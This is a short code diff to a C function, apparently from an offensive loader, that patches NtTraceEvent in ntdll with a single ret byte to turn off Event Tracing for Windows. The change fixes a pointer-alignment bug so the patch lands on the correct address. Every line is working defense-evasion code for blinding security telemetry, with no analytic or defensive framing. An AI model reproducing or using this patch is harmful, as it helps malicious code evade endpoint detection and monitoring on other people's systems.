@@ -110,16 +110,17 @@ BOOL sdPatchEtw(PVOID hNtdll) {
 	PBYTE pbPatchMe = nullptr;
 	BYTE bPatch = 0xC3;
 	SIZE_T szPatch = 1;
+	PBYTE pbPatchMeCopy = nullptr;
 
 	pbPatchMe = (PBYTE)sdGetProcAddress(hNtdll, NT_TRACE_EVENT);
+	pbPatchMeCopy = pbPatchMe;
 
-	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbPatchMe, &szPatch, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbPatchMeCopy, &szPatch, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 	if (status != STATUS_SUCCESS) {
 		return FALSE;
 	}
-	// we add 0x8f0 because the call aligns the address and thus overwrites our pointer :P
-	__builtin_memcpy((PVOID)(pbPatchMe + 0x8f0), &bPatch, 1); 
-	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbPatchMe, &szPatch, dwOldProtect, &dwOldProtect);
+	__builtin_memcpy((PVOID)(pbPatchMe), &bPatch, 1); 
+	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbPatchMeCopy, &szPatch, dwOldProtect, &dwOldProtect);
 	if (status != STATUS_SUCCESS) {
 		return FALSE;
 	}
